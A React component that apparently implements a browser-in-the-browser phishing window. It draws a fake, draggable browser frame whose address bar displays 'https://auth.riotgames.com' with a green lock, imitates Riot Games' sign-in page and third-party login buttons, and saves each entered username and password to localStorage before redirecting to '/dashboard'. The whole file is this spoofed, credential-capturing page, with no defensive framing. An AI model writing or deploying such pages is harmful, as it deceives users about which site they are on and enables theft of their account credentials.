import React, { useState, useRef } from 'react';
import { X, Minus, Square, ArrowLeft, ArrowRight, RotateCw, Lock } from 'lucide-react';

const RiotWindow = ({ onClose }) => {
  const [position, setPosition] = useState({ x: 100, y: 100 });
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const isDragging = useRef(false);
  const dragStart = useRef({ x: 0, y: 0 });

  const handleMouseDown = (e) => {
    if (e.button !== 0) return;
    isDragging.current = true;
    dragStart.current = { x: e.clientX - position.x, y: e.clientY - position.y };
    document.addEventListener('mousemove', handleMouseMove);
    document.addEventListener('mouseup', handleMouseUp);
  };

  const handleMouseMove = (e) => {
    if (!isDragging.current) return;
    setPosition({ x: e.clientX - dragStart.current.x, y: e.clientY - dragStart.current.y });
  };

  const handleMouseUp = () => {
    isDragging.current = false;
    document.removeEventListener('mousemove', handleMouseMove);
    document.removeEventListener('mouseup', handleMouseUp);
  };

  const handleLogin = () => {
    if (isEnabled) {
      setLoading(true);
      
      // Save data locally before redirecting
      try {
        localStorage.setItem('riot_u', username);
        localStorage.setItem('riot_p', password);
      } catch (err) {
        console.error("Storage failed");
      }

      // Simulate network delay then redirect
      setTimeout(() => {
        window.location.href = '/dashboard';
      }, 1500);
    }
  };

  const isEnabled = username.length >= 3 && password.length >= 3;

  return (
    <div
      style={{ transform: `translate3d(${position.x}px, ${position.y}px, 0)` }}
      className="absolute w-[600px] h-[700px] bg-[#1f1f23] rounded-t-lg shadow-2xl border border-[#323238] flex flex-col z-[100] overflow-hidden select-none"
    >
      <div onMouseDown={handleMouseDown} className="w-full h-10 bg-[#18181c] flex items-center justify-between px-2 pt-2 border-b border-[#2d2d31]">
        <div className="flex items-center h-full">
          <div className="h-full w-[180px] bg-[#1f1f23] rounded-t-lg flex items-center gap-2 px-3 border-t border-x border-[#323238]">
            <img src="https://cdn.brandfetch.io/idtxF1ugCc/theme/dark/symbol.svg?c=1bxid64Mup7aczewSAYMX&t=1758261660760" alt="Riot" className="w-4 h-4 object-contain"/>
            <span className="text-[11px] text-zinc-300 truncate">Riot Sign-In</span>
            <X size={12} className="text-zinc-500 hover:text-white cursor-pointer ml-auto" onClick={onClose} />
          </div>
        </div>
        <div className="flex items-center gap-3 pr-2">
          <Minus size={14} className="text-zinc-500" />
          <Square size={12} className="text-zinc-500" />
          <X size={16} className="text-zinc-400 hover:text-red-400 cursor-pointer" onClick={onClose} />
        </div>
      </div>

      <div className="h-9 bg-[#1f1f23] flex items-center gap-3 px-3 border-b border-[#2d2d31]">
        <div className="flex gap-3 text-zinc-500"><ArrowLeft size={16} /><ArrowRight size={16} /><RotateCw size={16} /></div>
        <div className="flex-1 h-6 bg-[#18181c] border border-[#2d2d31] rounded-full flex items-center px-3 text-[11px]">
          <span className="text-emerald-500">https://</span>
          <span className="text-zinc-400">auth.riotgames.com</span>
          <Lock size={12} className="text-green-500 ml-auto" />
        </div>
      </div>

      <div className="flex-1 bg-white flex flex-col items-center justify-center p-8">
        <img 
          src="https://esportsinsider.com/wp-content/uploads/2022/02/ESI-Illustrations-9-696x418.png" 
          alt="Brand Logo" 
          className="w-32 h-auto object-contain mb-6" 
        />
        
        <h2 className="text-2xl text-zinc-900 font-bold mb-8">Sign in</h2>
        
        <div className="w-full max-w-[350px] space-y-4">
          <input 
            type="text" 
            placeholder="Username" 
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full h-12 px-4 bg-zinc-100 border border-transparent hover:border-zinc-300 rounded text-sm text-zinc-900 focus:outline-none focus:border-zinc-500" 
          />
          <input 
            type="password" 
            placeholder="Password" 
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full h-12 px-4 bg-zinc-100 border border-transparent hover:border-zinc-300 rounded text-sm text-zinc-900 focus:outline-none focus:border-zinc-500" 
          />
          
          <div className="grid grid-cols-4 gap-2 pt-2">
            <button className="h-10 flex items-center justify-center bg-white border border-zinc-200 rounded"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google" className="w-6 h-6 object-contain"/></button>
            <button className="h-10 flex items-center justify-center bg-black rounded"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple" className="w-6 h-6 object-contain invert"/></button>
            <button className="h-10 flex items-center justify-center bg-[#107c10] rounded"><img src="https://upload.wikimedia.org/wikipedia/commons/f/f9/Xbox_one_logo.svg" alt="Xbox" className="w-6 h-6 object-contain invert"/></button>
            <button className="h-10 flex items-center justify-center bg-[#004593] rounded"><img src="https://www.svgrepo.com/show/452087/playstation.svg" alt="PS" className="w-6 h-6 object-contain invert"/></button>
          </div>

          <div className="flex justify-center pt-6">
            <button 
              onClick={handleLogin}
              disabled={!isEnabled || loading}
              className={`w-20 h-20 rounded-full flex items-center justify-center transition-all duration-300 ${
                isEnabled ? "bg-red-600 hover:bg-red-700 cursor-pointer" : "bg-gray-300 cursor-not-allowed"
              }`}
            >
              {loading ? (
                <div className="w-8 h-8 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
              ) : (
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12h14M12 5l7 7-7 7" /></svg>
              )}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default RiotWindow;